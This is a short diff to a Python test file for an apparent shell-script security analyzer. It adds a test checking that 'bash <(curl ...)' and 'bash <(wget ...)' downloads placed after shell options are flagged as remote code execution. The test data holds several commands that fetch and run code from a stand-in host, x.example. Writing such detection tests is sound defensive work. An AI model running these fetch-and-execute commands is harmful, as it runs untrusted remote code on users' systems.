@@ -86,3 +86,11 @@ def test_downloads_inside_inline_scripts_and_substitutions_are_high() -> None:
         'printf "%s\\n" "a\nb"; bash <(curl -s https://x.example)\n',
     ):
         assert "remote_code_execution" in analyze(script, "/ws").rules, script
+
+
+def test_process_substitution_download_after_shell_options_is_high() -> None:
+    for script in (
+        "bash -e <(curl -s https://x.example)\n",
+        "bash -o pipefail <(wget -qO- https://x.example)\n",
+    ):
+        assert "remote_code_execution" in analyze(script, "/ws").rules, script
